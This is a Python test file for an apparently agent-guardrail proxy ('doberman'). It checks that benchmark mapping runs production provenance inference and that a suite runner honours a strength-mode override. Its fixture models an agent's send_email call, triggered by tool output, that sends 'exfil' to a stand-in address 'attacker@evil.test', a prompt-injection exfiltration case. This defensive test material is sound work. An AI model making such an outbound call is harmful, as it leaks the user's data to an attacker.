"""Harness-fidelity tests (two-hosts W-A0.1 + W-A0.2).

A0.1 — the benchmark ``mapping`` runs the same generic inference the proxy runs
in production (``proxy.normalize``), so the engine sees a populated ``algebra`` /
``reversibility`` instead of a default all-unknown object. Without this, whole
classes of algebra-keyed guardrails (the lethal-trifecta floor, capability/
reversibility rules) are silently un-exercised by every benchmark.

A0.2 — the runner honors a ``mode`` override so a suite can be swept across the
four F6 strength modes.

Stub pipelines only; no dependence on which concrete rules fire.
"""

from __future__ import annotations

from doberman.models import (
    ActionType,
    Algebra,
    Decision,
    DestinationClass,
    EvalContext,
    GuardrailResult,
    Provenance,
    Risk,
    SecurityObject,
    SourceContext,
    Verdict,
)
from doberman.subjective.adapters import apply_adapters
from doberman.subjective.infer import infer_algebra, infer_reversibility
from tests.benchmarks.adapter import BenchmarkCase, CandidateAction
from tests.benchmarks.mapping import BENCHMARK_TS, to_security_object
from tests.benchmarks.runner import run_suite

# --- A0.1: the mapping runs production inference ----------------------------


def _egress_action(source_context: SourceContext) -> CandidateAction:
    return CandidateAction(
        action_type=ActionType.network_request,
        tool_name="send_email",
        target="attacker@evil.test",
        external_destination="attacker@evil.test",
        source_context=source_context,
        raw_arguments={"to": "attacker@evil.test", "body": "exfil"},
    )


def test_mapping_populates_inferred_algebra_not_default():
    # Pre-fix the mapping fed a default all-unknown Algebra, so provenance was
    # `unknown` and the destination `none` — the trifecta legs could never line
    # up. Post-fix the same inference the proxy runs populates them.
    so = to_security_object("agentdojo:x:0", _egress_action(SourceContext.tool_output))
    assert so.algebra != Algebra()
    assert so.algebra.provenance is Provenance.mixed
    assert so.algebra.destination_class is DestinationClass.unknown_external


def test_mapping_mirrors_production_inference():
    action = _egress_action(SourceContext.tool_output)
    so = to_security_object("aid", action)
    base = SecurityObject(
        id="aid",
        ts=BENCHMARK_TS,
        agent_role=action.agent_role,
        action_type=action.action_type,
        tool_name=action.tool_name,
        target=action.target,
        external_destination=action.external_destination,
        source_context=action.source_context,
    )
    raw = dict(action.raw_arguments)
    expected = apply_adapters(
        infer_algebra(base, raw), {"tool_name": action.tool_name, "arguments": raw}
    )
    assert so.algebra == expected
    assert so.reversibility == infer_reversibility(base, raw)


def test_mapping_provenance_tracks_source_context():
    # A trusted user instruction must not read as mixed/untrusted provenance.
    so = to_security_object("aid", _egress_action(SourceContext.user))
    assert so.algebra.provenance is Provenance.trusted_instruction


# --- A0.2: run_suite honors a mode override --------------------------------


class _ModeRecorder:
    """Stub pipeline recording the ``EvalContext.mode`` it is handed."""

    name = "mode-recorder"

    def __init__(self) -> None:
        self.modes: list[str] = []

    def decide(self, action: SecurityObject, ctx: EvalContext) -> Decision:
        self.modes.append(ctx.mode)
        return Decision(
            action_id=action.id,
            final_verdict=Verdict.PASS,
            final_risk=Risk.low,
            objective=GuardrailResult(verdict=Verdict.PASS, risk=Risk.low),
            decided_at=BENCHMARK_TS,
        )


class _OneActionAdapter:
    suite_name = "stub"

    def load(self):
        return (
            BenchmarkCase(
                case_id="c0",
                label="benign",
                actions=(CandidateAction(action_type=ActionType.file_read, tool_name="read"),),
                note="stub",
            ),
        )


def test_run_suite_mode_override_threads_to_eval_context():
    rec = _ModeRecorder()
    run_suite(_OneActionAdapter(), rec, mode="paranoid")
    assert rec.modes == ["paranoid"]


def test_run_suite_mode_none_uses_case_default():
    rec = _ModeRecorder()
    run_suite(_OneActionAdapter(), rec, mode=None)
    assert rec.modes == ["balanced"]  # CandidateAction.mode default
